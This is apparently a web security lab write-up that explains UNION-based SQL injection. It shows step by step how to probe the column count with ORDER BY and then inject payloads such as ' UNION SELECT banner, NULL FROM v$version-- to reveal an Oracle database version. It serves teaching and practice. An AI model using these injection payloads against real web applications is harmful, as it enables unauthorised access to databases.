# 🧪 Lab 3: SQL Injection - Discovering Columns and DB Version using UNION SELECT

## 🎯 Objective

This lab uses **UNION-based SQL Injection**. Our goal is to:
- Discover the **number of columns** returned by the query
- Use `UNION SELECT` to retrieve **database version info**
- Successfully **display the database banner/version** on the webpage

---

## 🧠 What Is UNION-Based SQL Injection?

**UNION SELECT** is a powerful SQL clause that lets us **combine results from multiple SELECT queries** into one.

This works **only if**:
- The number of columns in both SELECT statements is **the same**
- The data types are **compatible**

---

## 🧪 Normal Backend Query

```sql
SELECT * FROM users WHERE username = 'xyz';
```

This would return only one user's info.

But if we inject:
`' UNION SELECT banner, null FROM v$version--`

The query becomes:

`SELECT * FROM users WHERE username = '' UNION SELECT banner, null FROM v$version--';`

✅ Now it combines normal results with banner/version info from v$version.

## 🚨 Problem: We Don't Know the Number of Columns
We need to find how many columns the original query returns before we can use UNION SELECT.

### 🔎 Step 1: Find Number of Columns Using ORDER BY

Try injecting this:
```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```
Keep increasing the number until it throws an error.
That means the previous number is the correct column count.

### 🧪 Step 2: Use NULLs to Match Column Count

If the query has 2 columns, this works:
`' UNION SELECT NULL, NULL--`

Then you can replace one `NULL` with real data like:

`' UNION SELECT banner, NULL FROM v$version--`

### 🛠 Alternate Case with Only One Table

If the application only uses one visible table, use this trick:
`' UNION SELECT 'Hello', 'Minipan'--`

Or use:
`' UNION SELECT NULL, banner FROM v$version--`

## 🧪 Final Payload to Solve the Lab

We want to print the DB version, so:
`' UNION SELECT banner, NULL FROM v$version--`

Or if only 1 column:
`' UNION SELECT banner FROM v$version--`

Inject the payload into a vulnerable parameter like `?category=` or a search field using Burp Suite repeater if needed.

## 🧠 SQL Logic Breakdown

| SQL Component    | Role                                                |
| ---------------- | --------------------------------------------------- |
| `'`              | Closes original query string                        |
| `UNION SELECT`   | Combines original query with attacker-defined query |
| `banner, NULL`   | Fetches DB banner and fills other column with null  |
| `FROM v$version` | Grabs version info from Oracle-like DB              |
| `--`             | Comments out rest of the original SQL query         |


## ✅ Lab Solved!

Once the correct number of columns is matched and the payload is injected, the DB version will be displayed — solving the lab.




